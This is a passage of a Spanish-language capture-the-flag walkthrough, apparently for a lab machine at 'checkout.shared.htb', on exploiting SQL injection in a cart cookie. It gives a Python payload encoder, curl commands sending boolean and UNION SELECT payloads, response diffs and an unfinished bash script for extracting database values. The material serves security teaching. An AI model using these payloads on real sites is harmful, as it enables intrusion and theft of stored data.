<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">from</span><span style="color:#B56959;--shiki-dark:#C3E88D"> sys</span><span style="color:#B56959;--shiki-dark:#C3E88D"> import</span><span style="color:#B56959;--shiki-dark:#C3E88D"> argv</span></span>
<span class="line"></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">if</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> len(argv</span><span style="color:#393A34;--shiki-dark:#BABED8">) == 2:</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">        sqli</span><span style="color:#B56959;--shiki-dark:#C3E88D"> =</span><span style="color:#B56959;--shiki-dark:#C3E88D"> argv[</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1</span><span style="color:#B56959;--shiki-dark:#C3E88D">]</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">        sqli</span><span style="color:#B56959;--shiki-dark:#C3E88D"> =</span><span style="color:#B56959;--shiki-dark:#C3E88D"> sqli.replace</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">&#39;\\&#39;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">,</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">\\\\</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">        sqli</span><span style="color:#B56959;--shiki-dark:#C3E88D"> =</span><span style="color:#B56959;--shiki-dark:#C3E88D"> sqli.replace</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">&#39;&quot;&#39;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">,</span><span style="color:#59873A;--shiki-dark:#FFCB6B">&#39;\\&quot;&#39;</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">        print</span><span style="color:#393A34;--shiki-dark:#BABED8">(quote(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">&#39;{&quot;&#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +</span><span style="color:#B56959;--shiki-dark:#C3E88D"> argv[</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1</span><span style="color:#B56959;--shiki-dark:#C3E88D">]</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">&quot;:&quot;1&quot;}</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#393A34;--shiki-dark:#BABED8">))</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">chmod</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +x</span><span style="color:#B56959;--shiki-dark:#C3E88D"> makepayload.py</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">true</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#999999;--shiki-dark:#89DDFF">$(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">./makepayload.py</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">&#39; OR 1=1#</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Always resolves to true</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">false</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#999999;--shiki-dark:#89DDFF">$(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">./makepayload.py</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">&#39; AND 1=2#</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Always resolves to false</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">url</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">https://checkout.shared.htb</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">curl</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -k</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -s</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $url</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -b</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">custom_cart=</span><span style="color:#B56959;--shiki-dark:#BABED8">$true</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> sed</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">s/^ *//</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#1E754F;--shiki-dark:#89DDFF"> true</span><span style="color:#B56959;--shiki-dark:#C3E88D">.html</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">curl</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -k</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -s</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $url</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -b</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">custom_cart=</span><span style="color:#B56959;--shiki-dark:#BABED8">$false</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> sed</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">s/^ *//</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#1E754F;--shiki-dark:#89DDFF"> false</span><span style="color:#B56959;--shiki-dark:#C3E88D">.html</span></span></code></pre> 
<p>Esto debería dejarte con dos archivos llamados false.html y true.html. Para encontrar la diferencia entre los dos cuerpos de respuesta podemos usar diff.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">diff</span><span style="color:#1E754F;--shiki-dark:#89DDFF"> false</span><span style="color:#B56959;--shiki-dark:#C3E88D">.html</span><span style="color:#1E754F;--shiki-dark:#89DDFF"> true</span><span style="color:#B56959;--shiki-dark:#C3E88D">.html</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">37,39c37,39</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8">Not Found</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">/td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8">0</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">/td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#B07D48;--shiki-dark:#BABED8;font-style:inherit;--shiki-dark-font-style:italic">$0</span><span style="color:#393A34;--shiki-dark:#BABED8">,</span><span style="color:#AB5959;--shiki-dark:#89DDFF">00&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">/td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">---</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8">53GG2EF</span><span style="color:#AB5959;--shiki-dark:#89DDFF">8&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">/td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8">1</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">/td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#B07D48;--shiki-dark:#BABED8">$23</span><span style="color:#393A34;--shiki-dark:#BABED8">,</span><span style="color:#AB5959;--shiki-dark:#89DDFF">90&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">/td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">45c45</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">th scope=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">col</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#B07D48;--shiki-dark:#BABED8;font-style:inherit;--shiki-dark-font-style:italic">$0</span><span style="color:#393A34;--shiki-dark:#BABED8">,</span><span style="color:#AB5959;--shiki-dark:#89DDFF">00&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">/th</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">---</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">th scope=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">col</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#B07D48;--shiki-dark:#BABED8">$23</span><span style="color:#393A34;--shiki-dark:#BABED8">,</span><span style="color:#AB5959;--shiki-dark:#89DDFF">90&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">/th</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span></span></code></pre> 
<p>La consulta falsa devuelve «No encontrado» y valores cero para la cantidad y el precio, mientras que la consulta verdadera devuelve una entrada de producto. Esto es definitivamente suficiente evidencia de una vulnerabilidad de inyección SQL para comenzar la explotación.</p>
<h1 id="web-exploitation">Web Exploitation</h1>
<p>Ya hemos determinado que la inyección SQL ciega basada en booleanos es posible con las consultas true y false, pero hay muchas posibilidades de que podamos utilizar las consultas UNION SELECT para filtrar valores de la base de datos sin tener que utilizar un canal secundario.</p>
<h2 id="union-query-exfiltration">Union Query Exfiltration</h2>
<p>Primero vamos a averiguar el número de columnas de la consulta original para poder compararlo con nuestra extensión UNION SELECT.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">payload</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#999999;--shiki-dark:#89DDFF">$(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">./makepayload.py</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">&#39; UNION SELECT &#39;c0lumn1&#39;,&#39;c0lumn2&#39;,&#39;c0lumn3&#39;#</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">curl</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -k</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -s</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">https://checkout.shared.htb</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -b</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">custom_cart=</span><span style="color:#B56959;--shiki-dark:#BABED8">$payload</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> \</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">	sed</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">s/^ *//</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">	egrep</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">&lt;/?td&gt;</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8">c0lumn</span><span style="color:#AB5959;--shiki-dark:#89DDFF">2&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">/td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8">1</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">/td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8">$</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">/td</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span></span></code></pre> 
<p>Observa cómo la respuesta contiene el valor que enviamos en la segunda columna. Esto significa que podemos extraer datos a través de la segunda columna. Ahora vamos a crear un script para obtener cualquier valor en bruto de la base de datos.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">#!/bin/bash</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> -z</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$SELECT</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF"> ]</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span><span style="color:#998418;--shiki-dark:#82AAFF"> echo</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">SELECT=* FROM=* WHERE=* </span><span style="color:#B56959;--shiki-dark:#BABED8;font-style:inherit;--shiki-dark-font-style:italic">$0</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span><span style="color:#998418;--shiki-dark:#82AAFF"> exit</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">payload</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">&#39; UNION SELECT &#39;&#39;,</span><span style="color:#B56959;--shiki-dark:#BABED8">$SELECT</span><span style="color:#B56959;--shiki-dark:#C3E88D">,&#39;&#39;</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> -z</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$FROM</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF"> ]</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> ||</span><span style="color:#B07D48;--shiki-dark:#BABED8"> payload</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$payload</span><span style="color:#B56959;--shiki-dark:#C3E88D"> FROM </span><span style="color:#B56959;--shiki-dark:#BABED8">$FROM</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> -z</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$WHERE</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF"> ]</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> ||</span><span style="color:#B07D48;--shiki-dark:#BABED8"> payload</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$payload</span><span style="color:#B56959;--shiki-dark:#C3E88D"> WHERE </span><span style="color:#B56959;--shiki-dark:#BABED8">$WHERE</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">echo</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $payload</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">payload</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#999999;--shiki-dark:#89DDFF">$(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">./makepayload.py</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$payload</span><span style="color:#B56959;--shiki-dark:#C3E88D">#</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"></span>
